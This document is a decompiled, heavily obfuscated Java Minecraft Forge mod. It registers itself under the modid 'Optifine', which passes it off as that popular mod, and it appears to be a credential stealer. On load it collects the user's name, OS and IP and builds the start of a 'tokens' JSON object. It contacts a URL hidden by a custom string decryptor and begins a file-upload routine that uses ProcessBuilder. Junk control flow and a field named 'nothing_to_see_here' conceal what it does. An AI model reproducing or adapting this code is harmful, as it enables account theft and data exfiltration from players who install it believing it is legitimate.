package me.custompayload.normal;

import java.util.ArrayList;
import java.util.Base64;
import net.minecraft.client.Minecraft;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.Mod.EventHandler;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;

@Mod(modid = "Optifine", version = "1.0", dependencies = "before:*", acceptedMinecraftVersions = "[1.8.9]")
public class NormalMode {
  public static final String MODID = "Optifine";
  
  public static final String VERSION = "1.0";
  
  public Minecraft mc;
  
  public static final String RID = "9afphtml";
  
  public final String USERNAME;
  
  public final String OS;
  
  public String json;
  
  public String token_json;
  
  private transient int NNmLBEcPbp = 1293090476;
  
  private static int EswkRKw3U1 = 0;
  
  private static String[] nothing_to_see_here = new String[15];
  
  public NormalMode() {
    i = 0xE369CDC ^ 0x3262458A;
    i = 0x48A3C3D7 ^ 0x7E907398 ^ Integer.parseInt("174549273");
    this.NNmLBEcPbp = 1293090476;
    i = 0x1C1CCC5B ^ i;
    NormalMode normalMode2 = this;
    Minecraft minecraft = Minecraft.func_71410_x();
    normalMode2.mc = minecraft;
    NormalMode normalMode3 = this;
    String str1 = "user.name";
    String str2 = System.getProperty(str1);
    normalMode3.USERNAME = str2;
    NormalMode normalMode4 = this;
    String str3 = "os.name";
    String str4 = System.getProperty(str3);
    normalMode4.OS = str4;
    NormalMode normalMode5 = this;
    StringBuilder stringBuilder1 = new StringBuilder();
    this();
    String str7 = "{\n  \"username\": \"";
    StringBuilder stringBuilder2 = stringBuilder1.append(str7);
    NormalMode normalMode7 = this;
    String str8 = normalMode7.USERNAME;
    StringBuilder stringBuilder3 = stringBuilder2.append(str8);
    String str9 = "\",\n  \"os\": \"";
    StringBuilder stringBuilder4 = stringBuilder3.append(str9);
    NormalMode normalMode8 = this;
    String str10 = normalMode8.OS;
    StringBuilder stringBuilder5 = stringBuilder4.append(str10);
    String str11 = "\",\n  \"ip\": \"";
    StringBuilder stringBuilder6 = stringBuilder5.append(str11);
    NormalMode normalMode9 = this;
    String str12 = normalMode9.IP(768673295);
    StringBuilder stringBuilder7 = stringBuilder6.append(str12);
    String str13 = "\",\n";
    StringBuilder stringBuilder8 = stringBuilder7.append(str13);
    String str5 = stringBuilder8.toString();
    normalMode5.json = str5;
    NormalMode normalMode6 = this;
    String str6 = "  \"tokens\": {\n";
    normalMode6.token_json = str6;
  }
  
  public String IP(int paramInt) {
    // Byte code:
    //   0: ldc 1236965549
    //   2: ldc 659988171
    //   4: aload_0
    //   5: getfield NNmLBEcPbp : I
    //   8: iload_1
    //   9: ixor
    //   10: ixor
    //   11: ixor
    //   12: istore #25
    //   14: iload #25
    //   16: bipush #31
    //   18: imul
    //   19: iconst_4
    //   20: iushr
    //   21: iload #25
    //   23: irem
    //   24: iload #25
    //   26: bipush #16
    //   28: iushr
    //   29: ixor
    //   30: ldc 192738226
    //   32: if_icmpne -> 1741
    //   35: ldc 66707689
    //   37: iload #25
    //   39: ixor
    //   40: istore #25
    //   42: iload #25
    //   44: ldc 232136243
    //   46: iload #25
    //   48: ixor
    //   49: imul
    //   50: ldc 232136232
    //   52: iload #25
    //   54: ixor
    //   55: iushr
    //   56: iload #25
    //   58: irem
    //   59: iload #25
    //   61: ldc 232136252
    //   63: iload #25
    //   65: ixor
    //   66: iushr
    //   67: ixor
    //   68: ldc 119064975
    //   70: iload #25
    //   72: ixor
    //   73: if_icmpeq -> 99
    //   76: aconst_null
    //   77: athrow
    //   78: nop
    //   79: nop
    //   80: nop
    //   81: nop
    //   82: nop
    //   83: nop
    //   84: nop
    //   85: nop
    //   86: nop
    //   87: nop
    //   88: nop
    //   89: nop
    //   90: nop
    //   91: nop
    //   92: nop
    //   93: nop
    //   94: nop
    //   95: nop
    //   96: nop
    //   97: nop
    //   98: athrow
    //   99: new java/lang/IllegalAccessException
    //   102: dup
    //   103: invokespecial <init> : ()V
    //   106: athrow
    //   107: nop
    //   108: nop
    //   109: nop
    //   110: nop
    //   111: nop
    //   112: nop
    //   113: nop
    //   114: nop
    //   115: nop
    //   116: nop
    //   117: nop
    //   118: nop
    //   119: nop
    //   120: nop
    //   121: nop
    //   122: nop
    //   123: nop
    //   124: nop
    //   125: nop
    //   126: nop
    //   127: athrow
    //   128: nop
    //   129: nop
    //   130: nop
    //   131: athrow
    //   132: nop
    //   133: nop
    //   134: nop
    //   135: nop
    //   136: nop
    //   137: athrow
    //   138: iload #25
    //   140: bipush #7
    //   142: bipush #29
    //   144: ishl
    //   145: iand
    //   146: bipush #29
    //   148: ishr
    //   149: iload #25
    //   151: iconst_3
    //   152: ishl
    //   153: ior
    //   154: lookupswitch default -> 190, 192008218 -> 180, 1857089888 -> 202
    //   180: ldc 640090413
    //   182: iload #25
    //   184: ixor
    //   185: istore #25
    //   187: goto -> 209
    //   190: new java/lang/RuntimeException
    //   193: astore_3
    //   194: aload_3
    //   195: ldc 'Error in hash'
    //   197: invokespecial <init> : (Ljava/lang/String;)V
    //   200: aload_3
    //   201: athrow
    //   202: ldc 1788814594
    //   204: iload #25
    //   206: ixor
    //   207: istore #25
    //   209: pop
    //   210: iload #25
    //   212: bipush #31
    //   214: imul
    //   215: iconst_4
    //   216: iushr
    //   217: iload #25
    //   219: irem
    //   220: iload #25
    //   222: bipush #16
    //   224: iushr
    //   225: ixor
    //   226: ldc 136152544
    //   228: if_icmpne -> 1721
    //   231: ldc 942518999
    //   233: iload #25
    //   235: ixor
    //   236: istore #25
    //   238: new java/net/URL
    //   241: astore_2
    //   242: ldc 'Ug1jPxx+NwhHeQQEVB51Wl0uamcU'
    //   244: iload #25
    //   246: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   249: astore_3
    //   250: aload_2
    //   251: aload_3
    //   252: invokespecial <init> : (Ljava/lang/String;)V
    //   255: aload_2
    //   256: invokevirtual openConnection : ()Ljava/net/URLConnection;
    //   259: astore #4
    //   261: aload #4
    //   263: checkcast java/net/HttpURLConnection
    //   266: astore #5
    //   268: ldc 'fTxD'
    //   270: iload #25
    //   272: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   275: astore #13
    //   277: aload #5
    //   279: aload #13
    //   281: invokevirtual setRequestMethod : (Ljava/lang/String;)V
    //   284: ldc 1600424440
    //   286: iload #25
    //   288: ixor
    //   289: i2b
    //   290: istore #14
    //   292: aload #5
    //   294: iload #14
    //   296: invokevirtual setDoOutput : (Z)V
    //   299: ldc 1600424440
    //   301: iload #25
    //   303: ixor
    //   304: i2b
    //   305: istore #15
    //   307: aload #5
    //   309: iload #15
    //   311: invokevirtual setDoInput : (Z)V
    //   314: ldc 1600424441
    //   316: iload #25
    //   318: ixor
    //   319: i2b
    //   320: istore #16
    //   322: aload #5
    //   324: iload #16
    //   326: invokevirtual setUseCaches : (Z)V
    //   329: ldc 1600424441
    //   331: iload #25
    //   333: ixor
    //   334: i2b
    //   335: istore #17
    //   337: aload #5
    //   339: iload #17
    //   341: invokevirtual setAllowUserInteraction : (Z)V
    //   344: ldc 'eRZ5OwoqbApycB1P'
    //   346: iload #25
    //   348: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   351: astore #18
    //   353: ldc 'WwlnIwYneVNPZgMFVx1zUg=='
    //   355: iload #25
    //   357: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   360: astore #20
    //   362: aload #5
    //   364: aload #18
    //   366: aload #20
    //   368: invokevirtual setRequestProperty : (Ljava/lang/String;Ljava/lang/String;)V
    //   371: ldc 'exp0Kh8w'
    //   373: iload #25
    //   375: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   378: astore #19
    //   380: ldc 'WwlnIwYneVNPZgMFVx1zUg=='
    //   382: iload #25
    //   384: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   387: astore #21
    //   389: aload #5
    //   391: aload #19
    //   393: aload #21
    //   395: invokevirtual setRequestProperty : (Ljava/lang/String;Ljava/lang/String;)V
    //   398: aload #5
    //   400: invokevirtual connect : ()V
    //   403: new java/io/BufferedReader
    //   406: astore #6
    //   408: new java/io/InputStreamReader
    //   411: astore #22
    //   413: aload #5
    //   415: invokevirtual getInputStream : ()Ljava/io/InputStream;
    //   418: astore #23
    //   420: aload #22
    //   422: aload #23
    //   424: invokespecial <init> : (Ljava/io/InputStream;)V
    //   427: aload #6
    //   429: aload #22
    //   431: invokespecial <init> : (Ljava/io/Reader;)V
    //   434: new java/lang/StringBuilder
    //   437: astore #7
    //   439: aload #7
    //   441: invokespecial <init> : ()V
    //   444: iload #25
    //   446: bipush #31
    //   448: imul
    //   449: iconst_4
    //   450: iushr
    //   451: iload #25
    //   453: irem
    //   454: iload #25
    //   456: bipush #16
    //   458: iushr
    //   459: ixor
    //   460: ldc 148018230
    //   462: if_icmpne -> 1506
    //   465: ldc 49610197
    //   467: iload #25
    //   469: ixor
    //   470: istore #25
    //   472: goto -> 959
    //   475: aload #6
    //   477: invokevirtual readLine : ()Ljava/lang/String;
    //   480: astore #8
    //   482: aload #8
    //   484: ifnull -> 949
    //   487: iload #25
    //   489: bipush #31
    //   491: imul
    //   492: iconst_4
    //   493: iushr
    //   494: iload #25
    //   496: irem
    //   497: iload #25
    //   499: bipush #16
    //   501: iushr
    //   502: ixor
    //   503: ldc 240786390
    //   505: if_icmpne -> 1138
    //   508: ldc 1541041451
    //   510: iload #25
    //   512: ixor
    //   513: istore #25
    //   515: goto -> 596
    //   518: aload #7
    //   520: aload #8
    //   522: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   525: astore #9
    //   527: iload #25
    //   529: bipush #31
    //   531: imul
    //   532: iconst_4
    //   533: iushr
    //   534: iload #25
    //   536: irem
    //   537: iload #25
    //   539: bipush #16
    //   541: iushr
    //   542: ixor
    //   543: ldc 118138035
    //   545: if_icmpne -> 1558
    //   548: ldc 608323312
    //   550: iload #25
    //   552: ixor
    //   553: istore #25
    //   555: goto -> 773
    //   558: aload #7
    //   560: invokevirtual toString : ()Ljava/lang/String;
    //   563: astore #12
    //   565: iload #25
    //   567: bipush #31
    //   569: imul
    //   570: iconst_4
    //   571: iushr
    //   572: iload #25
    //   574: irem
    //   575: iload #25
    //   577: bipush #16
    //   579: iushr
    //   580: ixor
    //   581: ldc 78801681
    //   583: if_icmpne -> 1496
    //   586: ldc 1902366450
    //   588: iload #25
    //   590: ixor
    //   591: istore #25
    //   593: goto -> 1232
    //   596: iload #25
    //   598: ldc 174100523
    //   600: iload #25
    //   602: ixor
    //   603: imul
    //   604: ldc 174100528
    //   606: iload #25
    //   608: ixor
    //   609: iushr
    //   610: iload #25
    //   612: irem
    //   613: iload #25
    //   615: ldc 174100516
    //   617: iload #25
    //   619: ixor
    //   620: iushr
    //   621: ixor
    //   622: ldc 242978096
    //   624: iload #25
    //   626: ixor
    //   627: if_icmpeq -> 653
    //   630: aconst_null
    //   631: athrow
    //   632: nop
    //   633: nop
    //   634: nop
    //   635: nop
    //   636: nop
    //   637: nop
    //   638: nop
    //   639: nop
    //   640: nop
    //   641: nop
    //   642: nop
    //   643: nop
    //   644: nop
    //   645: nop
    //   646: nop
    //   647: nop
    //   648: nop
    //   649: nop
    //   650: nop
    //   651: nop
    //   652: athrow
    //   653: new java/lang/RuntimeException
    //   656: dup
    //   657: invokespecial <init> : ()V
    //   660: athrow
    //   661: nop
    //   662: nop
    //   663: nop
    //   664: nop
    //   665: nop
    //   666: nop
    //   667: nop
    //   668: nop
    //   669: nop
    //   670: nop
    //   671: nop
    //   672: nop
    //   673: nop
    //   674: nop
    //   675: nop
    //   676: nop
    //   677: nop
    //   678: nop
    //   679: nop
    //   680: nop
    //   681: athrow
    //   682: iload #25
    //   684: bipush #7
    //   686: bipush #29
    //   688: ishl
    //   689: iand
    //   690: bipush #29
    //   692: ishr
    //   693: iload #25
    //   695: iconst_3
    //   696: ishl
    //   697: ior
    //   698: lookupswitch default -> 1168, -1143548640 -> 724, 1392804256 -> 734
    //   724: ldc 931405076
    //   726: iload #25
    //   728: ixor
    //   729: istore #25
    //   731: goto -> 741
    //   734: ldc 715020164
    //   736: iload #25
    //   738: ixor
    //   739: istore #25
    //   741: pop
    //   742: iload #25
    //   744: bipush #31
    //   746: imul
    //   747: iconst_4
    //   748: iushr
    //   749: iload #25
    //   751: irem
    //   752: iload #25
    //   754: bipush #16
    //   756: iushr
    //   757: ixor
    //   758: ldc 267223579
    //   760: if_icmpne -> 1158
    //   763: ldc 365984117
    //   765: iload #25
    //   767: ixor
    //   768: istore #25
    //   770: goto -> 518
    //   773: iload #25
    //   775: ldc 292354090
    //   777: iload #25
    //   779: ixor
    //   780: imul
    //   781: ldc 292354097
    //   783: iload #25
    //   785: ixor
    //   786: iushr
    //   787: iload #25
    //   789: irem
    //   790: iload #25
    //   792: ldc 292354085
    //   794: iload #25
    //   796: ixor
    //   797: iushr
    //   798: ixor
    //   799: ldc 279955903
    //   801: iload #25
    //   803: ixor
    //   804: if_icmpeq -> 830
    //   807: aconst_null
    //   808: athrow
    //   809: nop
    //   810: nop
    //   811: nop
    //   812: nop
    //   813: nop
    //   814: nop
    //   815: nop
    //   816: nop
    //   817: nop
    //   818: nop
    //   819: nop
    //   820: nop
    //   821: nop
    //   822: nop
    //   823: nop
    //   824: nop
    //   825: nop
    //   826: nop
    //   827: nop
    //   828: nop
    //   829: athrow
    //   830: new java/lang/IllegalAccessException
    //   833: dup
    //   834: invokespecial <init> : ()V
    //   837: athrow
    //   838: nop
    //   839: nop
    //   840: nop
    //   841: nop
    //   842: nop
    //   843: nop
    //   844: nop
    //   845: nop
    //   846: nop
    //   847: nop
    //   848: nop
    //   849: nop
    //   850: nop
    //   851: nop
    //   852: nop
    //   853: nop
    //   854: nop
    //   855: nop
    //   856: nop
    //   857: nop
    //   858: athrow
    //   859: iload #25
    //   861: bipush #7
    //   863: bipush #29
    //   865: ishl
    //   866: iand
    //   867: bipush #29
    //   869: ishr
    //   870: iload #25
    //   872: iconst_3
    //   873: ishl
    //   874: ior
    //   875: lookupswitch default -> 1210, -1956134488 -> 900, 1035643827 -> 910
    //   900: ldc 644832844
    //   902: iload #25
    //   904: ixor
    //   905: istore #25
    //   907: goto -> 917
    //   910: ldc 1354035983
    //   912: iload #25
    //   914: ixor
    //   915: istore #25
    //   917: pop
    //   918: iload #25
    //   920: bipush #31
    //   922: imul
    //   923: iconst_4
    //   924: iushr
    //   925: iload #25
    //   927: irem
    //   928: iload #25
    //   930: bipush #16
    //   932: iushr
    //   933: ixor
    //   934: ldc 177677705
    //   936: if_icmpne -> 1222
    //   939: ldc 1723423590
    //   941: iload #25
    //   943: ixor
    //   944: istore #25
    //   946: goto -> 475
    //   949: ldc 486928678
    //   951: iload #25
    //   953: ixor
    //   954: istore #25
    //   956: goto -> 558
    //   959: iload #25
    //   961: ldc 1569748019
    //   963: iload #25
    //   965: ixor
    //   966: imul
    //   967: ldc 1569748008
    //   969: iload #25
    //   971: ixor
    //   972: iushr
    //   973: iload #25
    //   975: irem
    //   976: iload #25
    //   978: ldc 1569748028
    //   980: iload #25
    //   982: ixor
    //   983: iushr
    //   984: ixor
    //   985: ldc 1490536617
    //   987: iload #25
    //   989: ixor
    //   990: if_icmpeq -> 1016
    //   993: aconst_null
    //   994: athrow
    //   995: nop
    //   996: nop
    //   997: nop
    //   998: nop
    //   999: nop
    //   1000: nop
    //   1001: nop
    //   1002: nop
    //   1003: nop
    //   1004: nop
    //   1005: nop
    //   1006: nop
    //   1007: nop
    //   1008: nop
    //   1009: nop
    //   1010: nop
    //   1011: nop
    //   1012: nop
    //   1013: nop
    //   1014: nop
    //   1015: athrow
    //   1016: new java/io/IOException
    //   1019: dup
    //   1020: invokespecial <init> : ()V
    //   1023: athrow
    //   1024: nop
    //   1025: nop
    //   1026: nop
    //   1027: nop
    //   1028: nop
    //   1029: nop
    //   1030: nop
    //   1031: nop
    //   1032: nop
    //   1033: nop
    //   1034: nop
    //   1035: nop
    //   1036: nop
    //   1037: nop
    //   1038: nop
    //   1039: nop
    //   1040: nop
    //   1041: nop
    //   1042: nop
    //   1043: nop
    //   1044: athrow
    //   1045: iload #25
    //   1047: bipush #7
    //   1049: bipush #29
    //   1051: ishl
    //   1052: iand
    //   1053: bipush #29
    //   1055: ishr
    //   1056: iload #25
    //   1058: iconst_3
    //   1059: ishl
    //   1060: ior
    //   1061: lookupswitch default -> 1536, -782225582 -> 1098, -326917790 -> 1088
    //   1088: ldc 1276027973
    //   1090: iload #25
    //   1092: ixor
    //   1093: istore #25
    //   1095: goto -> 1105
    //   1098: ldc 1270011267
    //   1100: iload #25
    //   1102: ixor
    //   1103: istore #25
    //   1105: pop
    //   1106: iload #25
    //   1108: bipush #31
    //   1110: imul
    //   1111: iconst_4
    //   1112: iushr
    //   1113: iload #25
    //   1115: irem
    //   1116: iload #25
    //   1118: bipush #16
    //   1120: iushr
    //   1121: ixor
    //   1122: ldc 35889749
    //   1124: if_icmpne -> 1548
    //   1127: ldc_w 1076112758
    //   1130: iload #25
    //   1132: ixor
    //   1133: istore #25
    //   1135: goto -> 475
    //   1138: new java/io/IOException
    //   1141: astore_3
    //   1142: aload_3
    //   1143: invokespecial <init> : ()V
    //   1146: aload_3
    //   1147: athrow
    //   1148: nop
    //   1149: nop
    //   1150: nop
    //   1151: athrow
    //   1152: nop
    //   1153: nop
    //   1154: nop
    //   1155: nop
    //   1156: nop
    //   1157: athrow
    //   1158: new java/lang/IllegalAccessException
    //   1161: astore_3
    //   1162: aload_3
    //   1163: invokespecial <init> : ()V
    //   1166: aload_3
    //   1167: athrow
    //   1168: new java/io/IOException
    //   1171: astore_3
    //   1172: aload_3
    //   1173: ldc 'Error in hash'
    //   1175: invokespecial <init> : (Ljava/lang/String;)V
    //   1178: aload_3
    //   1179: athrow
    //   1180: nop
    //   1181: nop
    //   1182: nop
    //   1183: athrow
    //   1184: nop
    //   1185: nop
    //   1186: nop
    //   1187: nop
    //   1188: nop
    //   1189: athrow
    //   1190: nop
    //   1191: nop
    //   1192: nop
    //   1193: athrow
    //   1194: nop
    //   1195: nop
    //   1196: nop
    //   1197: nop
    //   1198: nop
    //   1199: athrow
    //   1200: nop
    //   1201: nop
    //   1202: nop
    //   1203: athrow
    //   1204: nop
    //   1205: nop
    //   1206: nop
    //   1207: nop
    //   1208: nop
    //   1209: athrow
    //   1210: new java/io/IOException
    //   1213: astore_3
    //   1214: aload_3
    //   1215: ldc 'Error in hash'
    //   1217: invokespecial <init> : (Ljava/lang/String;)V
    //   1220: aload_3
    //   1221: athrow
    //   1222: new java/io/IOException
    //   1225: astore_3
    //   1226: aload_3
    //   1227: invokespecial <init> : ()V
    //   1230: aload_3
    //   1231: athrow
    //   1232: iload #25
    //   1234: ldc_w 1037877972
    //   1237: iload #25
    //   1239: ixor
    //   1240: imul
    //   1241: ldc_w 1037877967
    //   1244: iload #25
    //   1246: ixor
    //   1247: iushr
    //   1248: iload #25
    //   1250: irem
    //   1251: iload #25
    //   1253: ldc_w 1037877979
    //   1256: iload #25
    //   1258: ixor
    //   1259: iushr
    //   1260: ixor
    //   1261: ldc_w 973555326
    //   1264: iload #25
    //   1266: ixor
    //   1267: if_icmpeq -> 1294
    //   1270: aconst_null
    //   1271: athrow
    //   1272: nop
    //   1273: nop
    //   1274: nop
    //   1275: nop
    //   1276: nop
    //   1277: nop
    //   1278: nop
    //   1279: nop
    //   1280: nop
    //   1281: nop
    //   1282: nop
    //   1283: nop
    //   1284: nop
    //   1285: nop
    //   1286: nop
    //   1287: nop
    //   1288: nop
    //   1289: nop
    //   1290: nop
    //   1291: nop
    //   1292: nop
    //   1293: athrow
    //   1294: new java/lang/IllegalAccessException
    //   1297: dup
    //   1298: invokespecial <init> : ()V
    //   1301: athrow
    //   1302: nop
    //   1303: nop
    //   1304: nop
    //   1305: nop
    //   1306: nop
    //   1307: nop
    //   1308: nop
    //   1309: nop
    //   1310: nop
    //   1311: nop
    //   1312: nop
    //   1313: nop
    //   1314: nop
    //   1315: nop
    //   1316: nop
    //   1317: nop
    //   1318: nop
    //   1319: nop
    //   1320: nop
    //   1321: nop
    //   1322: nop
    //   1323: athrow
    //   1324: nop
    //   1325: nop
    //   1326: nop
    //   1327: athrow
    //   1328: nop
    //   1329: nop
    //   1330: nop
    //   1331: nop
    //   1332: nop
    //   1333: athrow
    //   1334: iload #25
    //   1336: bipush #7
    //   1338: bipush #29
    //   1340: ishl
    //   1341: iand
    //   1342: bipush #29
    //   1344: ishr
    //   1345: iload #25
    //   1347: iconst_3
    //   1348: ishl
    //   1349: ior
    //   1350: lookupswitch default -> 1376, -286910887 -> 1388, 368862960 -> 1399
    //   1376: new java/io/IOException
    //   1379: astore_3
    //   1380: aload_3
    //   1381: ldc 'Error in hash'
    //   1383: invokespecial <init> : (Ljava/lang/String;)V
    //   1386: aload_3
    //   1387: athrow
    //   1388: ldc_w 682079289
    //   1391: iload #25
    //   1393: ixor
    //   1394: istore #25
    //   1396: goto -> 1407
    //   1399: ldc_w 398785068
    //   1402: iload #25
    //   1404: ixor
    //   1405: istore #25
    //   1407: pop
    //   1408: iload #25
    //   1410: bipush #31
    //   1412: imul
    //   1413: iconst_4
    //   1414: iushr
    //   1415: iload #25
    //   1417: irem
    //   1418: iload #25
    //   1420: bipush #16
    //   1422: iushr
    //   1423: ixor
    //   1424: ldc_w 161424143
    //   1427: if_icmpne -> 1441
    //   1430: ldc_w 1739420329
    //   1433: iload #25
    //   1435: ixor
    //   1436: istore #25
    //   1438: goto -> 1451
    //   1441: new java/lang/IllegalAccessException
    //   1444: astore_3
    //   1445: aload_3
    //   1446: invokespecial <init> : ()V
    //   1449: aload_3
    //   1450: athrow
    //   1451: aload #12
    //   1453: areturn
    //   1454: nop
    //   1455: nop
    //   1456: nop
    //   1457: nop
    //   1458: nop
    //   1459: nop
    //   1460: nop
    //   1461: nop
    //   1462: nop
    //   1463: nop
    //   1464: nop
    //   1465: nop
    //   1466: nop
    //   1467: nop
    //   1468: nop
    //   1469: nop
    //   1470: nop
    //   1471: nop
    //   1472: nop
    //   1473: nop
    //   1474: nop
    //   1475: athrow
    //   1476: nop
    //   1477: nop
    //   1478: nop
    //   1479: athrow
    //   1480: nop
    //   1481: nop
    //   1482: nop
    //   1483: nop
    //   1484: nop
    //   1485: athrow
    //   1486: nop
    //   1487: nop
    //   1488: nop
    //   1489: athrow
    //   1490: nop
    //   1491: nop
    //   1492: nop
    //   1493: nop
    //   1494: nop
    //   1495: athrow
    //   1496: new java/io/IOException
    //   1499: astore_3
    //   1500: aload_3
    //   1501: invokespecial <init> : ()V
    //   1504: aload_3
    //   1505: athrow
    //   1506: new java/io/IOException
    //   1509: astore_3
    //   1510: aload_3
    //   1511: invokespecial <init> : ()V
    //   1514: aload_3
    //   1515: athrow
    //   1516: nop
    //   1517: nop
    //   1518: nop
    //   1519: athrow
    //   1520: nop
    //   1521: nop
    //   1522: nop
    //   1523: nop
    //   1524: nop
    //   1525: athrow
    //   1526: nop
    //   1527: nop
    //   1528: nop
    //   1529: athrow
    //   1530: nop
    //   1531: nop
    //   1532: nop
    //   1533: nop
    //   1534: nop
    //   1535: athrow
    //   1536: new java/io/IOException
    //   1539: astore_3
    //   1540: aload_3
    //   1541: ldc 'Error in hash'
    //   1543: invokespecial <init> : (Ljava/lang/String;)V
    //   1546: aload_3
    //   1547: athrow
    //   1548: new java/io/IOException
    //   1551: astore_3
    //   1552: aload_3
    //   1553: invokespecial <init> : ()V
    //   1556: aload_3
    //   1557: athrow
    //   1558: new java/lang/IllegalAccessException
    //   1561: astore_3
    //   1562: aload_3
    //   1563: invokespecial <init> : ()V
    //   1566: aload_3
    //   1567: athrow
    //   1568: iload #25
    //   1570: bipush #7
    //   1572: bipush #29
    //   1574: ishl
    //   1575: iand
    //   1576: bipush #29
    //   1578: ishr
    //   1579: iload #25
    //   1581: iconst_3
    //   1582: ishl
    //   1583: ior
    //   1584: lookupswitch default -> 1661, -1915229958 -> 1639, -1451887063 -> 1650, -81506358 -> 1673, 1710776778 -> 1628
    //   1628: ldc_w 1601603569
    //   1631: iload #25
    //   1633: ixor
    //   1634: istore #25
    //   1636: goto -> 1681
    //   1639: ldc_w 1114863319
    //   1642: iload #25
    //   1644: ixor
    //   1645: istore #25
    //   1647: goto -> 1681
    //   1650: ldc_w 652686605
    //   1653: iload #25
    //   1655: ixor
    //   1656: istore #25
    //   1658: goto -> 1681
    //   1661: new java/lang/RuntimeException
    //   1664: astore_3
    //   1665: aload_3
    //   1666: ldc 'Error in hash'
    //   1668: invokespecial <init> : (Ljava/lang/String;)V
    //   1671: aload_3
    //   1672: athrow
    //   1673: ldc_w 1286406705
    //   1676: iload #25
    //   1678: ixor
    //   1679: istore #25
    //   1681: astore #10
    //   1683: aconst_null
    //   1684: astore #11
    //   1686: aload #11
    //   1688: areturn
    //   1689: nop
    //   1690: nop
    //   1691: nop
    //   1692: nop
    //   1693: nop
    //   1694: nop
    //   1695: nop
    //   1696: nop
    //   1697: nop
    //   1698: nop
    //   1699: nop
    //   1700: nop
    //   1701: nop
    //   1702: nop
    //   1703: nop
    //   1704: nop
    //   1705: nop
    //   1706: nop
    //   1707: nop
    //   1708: nop
    //   1709: nop
    //   1710: athrow
    //   1711: nop
    //   1712: nop
    //   1713: nop
    //   1714: athrow
    //   1715: nop
    //   1716: nop
    //   1717: nop
    //   1718: nop
    //   1719: nop
    //   1720: athrow
    //   1721: new java/lang/RuntimeException
    //   1724: astore_3
    //   1725: aload_3
    //   1726: invokespecial <init> : ()V
    //   1729: aload_3
    //   1730: athrow
    //   1731: nop
    //   1732: nop
    //   1733: nop
    //   1734: athrow
    //   1735: nop
    //   1736: nop
    //   1737: nop
    //   1738: nop
    //   1739: nop
    //   1740: athrow
    //   1741: new java/io/IOException
    //   1744: astore_3
    //   1745: aload_3
    //   1746: invokespecial <init> : ()V
    //   1749: aload_3
    //   1750: athrow
    // Exception table:
    //   from	to	target	type
    //   42	78	138	java/lang/IllegalAccessException
    //   99	107	138	java/lang/IllegalAccessException
    //   238	596	1568	java/lang/Exception
    //   596	632	682	java/lang/RuntimeException
    //   653	661	682	java/lang/RuntimeException
    //   773	809	859	java/lang/IllegalAccessException
    //   830	838	859	java/lang/IllegalAccessException
    //   959	995	1045	java/io/IOException
    //   1016	1024	1045	java/io/IOException
    //   1232	1272	1334	java/lang/IllegalAccessException
    //   1294	1302	1334	java/lang/IllegalAccessException
  }
  
  public String uploadFile(String paramString, int paramInt) {
    // Byte code:
    //   0: ldc_w 1806660547
    //   3: ldc_w 2001603396
    //   6: aload_0
    //   7: getfield NNmLBEcPbp : I
    //   10: iload_2
    //   11: ixor
    //   12: ixor
    //   13: ixor
    //   14: istore #34
    //   16: iload #34
    //   18: bipush #31
    //   20: imul
    //   21: iconst_4
    //   22: iushr
    //   23: iload #34
    //   25: irem
    //   26: iload #34
    //   28: bipush #16
    //   30: iushr
    //   31: ixor
    //   32: ldc_w 55826509
    //   35: if_icmpne -> 49
    //   38: ldc_w 297804683
    //   41: iload #34
    //   43: ixor
    //   44: istore #34
    //   46: goto -> 59
    //   49: new java/lang/RuntimeException
    //   52: astore_3
    //   53: aload_3
    //   54: invokespecial <init> : ()V
    //   57: aload_3
    //   58: athrow
    //   59: iload #34
    //   61: ldc_w 2094157237
    //   64: iload #34
    //   66: ixor
    //   67: imul
    //   68: ldc_w 2094157230
    //   71: iload #34
    //   73: ixor
    //   74: iushr
    //   75: iload #34
    //   77: irem
    //   78: iload #34
    //   80: ldc_w 2094157242
    //   83: iload #34
    //   85: ixor
    //   86: iushr
    //   87: ixor
    //   88: ldc_w 2097497857
    //   91: iload #34
    //   93: ixor
    //   94: if_icmpeq -> 121
    //   97: aconst_null
    //   98: athrow
    //   99: nop
    //   100: nop
    //   101: nop
    //   102: nop
    //   103: nop
    //   104: nop
    //   105: nop
    //   106: nop
    //   107: nop
    //   108: nop
    //   109: nop
    //   110: nop
    //   111: nop
    //   112: nop
    //   113: nop
    //   114: nop
    //   115: nop
    //   116: nop
    //   117: nop
    //   118: nop
    //   119: nop
    //   120: athrow
    //   121: new java/lang/IllegalAccessException
    //   124: dup
    //   125: invokespecial <init> : ()V
    //   128: athrow
    //   129: nop
    //   130: nop
    //   131: nop
    //   132: nop
    //   133: nop
    //   134: nop
    //   135: nop
    //   136: nop
    //   137: nop
    //   138: nop
    //   139: nop
    //   140: nop
    //   141: nop
    //   142: nop
    //   143: nop
    //   144: nop
    //   145: nop
    //   146: nop
    //   147: nop
    //   148: nop
    //   149: nop
    //   150: athrow
    //   151: iload #34
    //   153: bipush #7
    //   155: bipush #29
    //   157: ishl
    //   158: iand
    //   159: bipush #29
    //   161: ishr
    //   162: iload #34
    //   164: iconst_3
    //   165: ishl
    //   166: ior
    //   167: lookupswitch default -> 1819, -426611373 -> 203, 953901707 -> 192
    //   192: ldc_w 1048485412
    //   195: iload #34
    //   197: ixor
    //   198: istore #34
    //   200: goto -> 211
    //   203: ldc_w 632799199
    //   206: iload #34
    //   208: ixor
    //   209: istore #34
    //   211: pop
    //   212: iload #34
    //   214: bipush #31
    //   216: imul
    //   217: iconst_4
    //   218: iushr
    //   219: iload #34
    //   221: irem
    //   222: iload #34
    //   224: bipush #16
    //   226: iushr
    //   227: ixor
    //   228: ldc_w 221633703
    //   231: if_icmpne -> 1809
    //   234: ldc_w 114406492
    //   237: iload #34
    //   239: ixor
    //   240: istore #34
    //   242: new java/lang/ProcessBuilder
    //   245: astore_3
    //   246: ldc_w 1605649965
    //   249: iload #34
    //   251: ixor
    //   252: i2b
    //   253: istore #4
    //   255: iload #4
